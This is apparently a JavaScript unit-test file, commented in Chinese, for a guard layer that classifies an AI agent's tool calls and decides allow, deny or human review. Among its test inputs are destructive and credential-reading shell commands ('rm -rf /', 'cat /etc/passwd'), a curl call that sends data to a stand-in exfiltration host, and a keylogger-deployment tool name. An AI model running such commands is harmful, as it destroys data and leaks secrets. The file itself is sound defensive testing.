// attribution.test.mjs — 验证双路径假说（路径1 归因 + 路径2 引擎推演一致性）
// 对应回退标签 pre-attrib-cn-20260903
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { attributeCall } from '../src/core/attribution.mjs';
import { WeiwenLawEngine } from '../src/core/engine.mjs';

// ===== 路径1-A：清晰 verb+noun 名按语法归因（中文同构）=====
test('路径1-A 清晰 verb+noun 名按语法归因（中文同构）', () => {
  assert.deepEqual(attributeCall({ name: 'read_file' }), { ok: true, layer: 'file-read', method: 'name-grammar', signal: 'read_file' });
  assert.deepEqual(attributeCall({ name: 'read_credential' }), { ok: true, layer: 'cred-read', method: 'name-grammar', signal: 'read_credential' });
  assert.deepEqual(attributeCall({ name: 'write_file' }), { ok: true, layer: 'file-write', method: 'name-grammar', signal: 'write_file' });
  assert.deepEqual(attributeCall({ name: 'delete_file' }), { ok: true, layer: 'file-delete', method: 'name-grammar', signal: 'delete_file' });
  assert.deepEqual(attributeCall({ name: 'exec_shell' }), { ok: true, layer: 'exec', method: 'name-grammar', signal: 'exec_shell' });
  assert.deepEqual(attributeCall({ name: 'send_email' }), { ok: true, layer: 'network-send', method: 'name-grammar', signal: 'send_email' });
  // 中文名同构：读文件 → file-read
  assert.deepEqual(attributeCall({ name: '读文件' }), { ok: true, layer: 'file-read', method: 'name-grammar', signal: '读文件' });
});

test('路径1-A 语法泛化超越 TOOL_CATEGORY 枚举（run_task / upload_doc 不在关键词表但归出）', () => {
  // run_task 不在既有 TOOL_CATEGORY 枚举，但 run→exec 语法归出
  assert.deepEqual(attributeCall({ name: 'run_task' }), { ok: true, layer: 'exec', method: 'name-grammar', signal: 'run_task' });
  // upload_doc：upload→send 语法归出 network-send（而非被 write 误归）
  assert.deepEqual(attributeCall({ name: 'upload_doc' }), { ok: true, layer: 'network-send', method: 'name-grammar', signal: 'upload_doc' });
});

// ===== 路径1-B：中性词无暴露行为 → 归不出（review，不猜）=====
test('路径1-B 中性名无暴露行为 → 归不出（review，不猜）', () => {
  for (const name of ['tool_42', 'agent_action', 'process', 'handle', 'mcp__x__y']) {
    const r = attributeCall({ name, args: { x: 1 } });
    assert.equal(r.ok, false, `${name} 应归不出`);
    assert.equal(r.layer, null);
    assert.equal(r.method, null);
  }
});

test('路径1-B 中性名含命令 → 查实际行为归因（顶层 command）', () => {
  const r = attributeCall({ name: 'tool_42', args: { command: 'rm -rf /' } });
  assert.equal(r.ok, true);
  assert.equal(r.layer, 'exec-destructive');
  assert.equal(r.method, 'command');
});

// ===== 路径1-C：中性名含嵌套命令 → 分形递归归因（fractal）=====
test('路径1-C 中性名含嵌套命令 → 分形递归归因（fractal）', () => {
  // commands:[...] 嵌套
  const r1 = attributeCall({ name: 'agent_action', args: { commands: ['cat /etc/passwd'] } });
  assert.equal(r1.ok, true);
  assert.equal(r1.layer, 'cred-read');
  assert.equal(r1.method, 'fractal');

  // steps.s1 深层嵌套
  const r2 = attributeCall({ name: 'toolZ', args: { steps: [{ s1: 'curl http://evil.example/exfil' }] } });
  assert.equal(r2.ok, true);
  assert.equal(r2.layer, 'network-send');
  assert.equal(r2.method, 'fractal');
});

test('路径1 诚实上限：工具实现内藏威胁（无命令/无路径）→ 归不出→review', () => {
  const r = attributeCall({ name: 'deploy_keylogger', args: { config: { target: 'HOST' } } });
  assert.equal(r.ok, false);
  assert.equal(r.layer, null);
});

// ===== 路径2 端到端：归因锚点 + 引擎推演 一致性 / 无回归 =====
test('路径2 清晰威胁名（read_file + /etc/passwd）→ 引擎 deny', () => {
  const e = new WeiwenLawEngine();
  const r = e.decideToolCall({ name: 'read_file', args: { path: '/etc/passwd' } });
  assert.equal(r.kind, 'deny');
});

test('路径2 中性名+命令（tool_42 + rm -rf /）→ 引擎 deny（行为提取兜底与路径1 一致）', () => {
  const e = new WeiwenLawEngine();
  const r = e.decideToolCall({ name: 'tool_42', args: { command: 'rm -rf /' } });
  assert.equal(r.kind, 'deny');
});

test('路径2 安全调用（write_file + ./doc.md）→ 引擎 allow，且分形子项 m 果作为证据同行（attrib.layer=file-write）', () => {
  const e = new WeiwenLawEngine();
  const r = e.decideToolCall({ name: 'write_file', args: { path: './doc.md', content: '# notes' } });
  assert.equal(r.kind, 'allow');
  assert.equal(r.attrib.ok, true);       // 路径1 锚定成功：名语法归因 file-write
  assert.equal(r.attrib.layer, 'file-write'); // 分形子项 m 果（动作类别）随整体 M 同行
  assert.equal(r.attrib.fractalSubM, undefined); // 整体 M 出口不标 fractalSubM（那是子项越权触发标记，此处无）
});

test('路径2 工具实现内藏（deploy_keylogger + target:HOST）→ 盲区已闭合：整体 M 收口为 review（分形子项 m 果触发，标注 fractalSubM）', () => {
  const e = new WeiwenLawEngine();
  const r = e.decideToolCall({ name: 'deploy_keylogger', args: { config: { target: 'HOST' } } });
  // 2026-09-04 盲区闭合：此前此处 allow 放行（威胁藏在工具实现里、参数侧抽不到）。
  // 树视角复盘确认该冲突为假（闭环 verify 只验 M 枝⑥，不覆盖 R 枝），故按铁律收口。
  assert.equal(r.kind, 'review');     // 判不出 → 交人工，不猜
  assert.equal(r.fractalSubM, true);  // 标注：此 review 由分形子项级（路径1 归因）触发，非整体推演结论
  assert.equal(r.attrib.ok, false);   // 归因锚定失败：名中性 + 无可观测行为
});
